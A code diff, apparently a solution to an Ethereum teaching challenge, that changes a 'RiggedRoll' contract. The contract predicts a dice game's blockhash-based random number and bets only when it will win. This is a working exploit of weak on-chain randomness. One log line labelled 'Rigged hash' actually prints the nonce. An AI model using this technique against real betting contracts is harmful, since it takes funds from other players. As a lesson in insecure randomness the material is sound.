@@ -7,7 +7,6 @@ import "@openzeppelin/contracts/access/Ownable.sol";
 
 contract RiggedRoll is Ownable {
     DiceGame public diceGame;
-    uint256 public nonce = 0;
 
     constructor(address payable diceGameAddress) {
         diceGame = DiceGame(diceGameAddress);
@@ -18,6 +17,10 @@ contract RiggedRoll is Ownable {
         //validate there is eth to withdraw
         require(address(this).balance >= _amount);
         payable(_addr).transfer(_amount);
+    }
+
+    function getNonce() public view returns (uint256) {
+        return diceGame.getNonce();
     }
 
     //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
@@ -32,24 +35,24 @@ contract RiggedRoll is Ownable {
         );
 
         bytes32 prevHash = blockhash(block.number - 1);
-        bytes32 hash = keccak256(abi.encodePacked(prevHash, diceGame, nonce));
+        bytes32 hash = keccak256(
+            abi.encodePacked(prevHash, address(diceGame), diceGame.getNonce())
+        );
         uint256 roll = uint256(hash) % 16;
 
         console.log("\t", "   Rigged Roll:", roll);
-        console.log("\t", "   Rigged Nonce:", nonce);
         console.log("\t", "   Riggedprev blockNumber:", block.number - 1);
         console.log("\t", "   Rigged hash:", uint256(hash));
-
-        nonce++;
+        console.log("\t", "   Rigged hash:", diceGame.getNonce());
 
         //return if not a winner
         if (roll > 2) {
-            console.log("Loser");
-            return;
+            console.log("\t", "Loser");
+            revert("Roll is greater than 2");
         }
 
         //if winning numbers then call rollTheDice() fro DiceGame to win
-        console.log("Winner");
+        console.log("\t", "Winner");
         diceGame.rollTheDice{value: .002 ether}();
     }
 
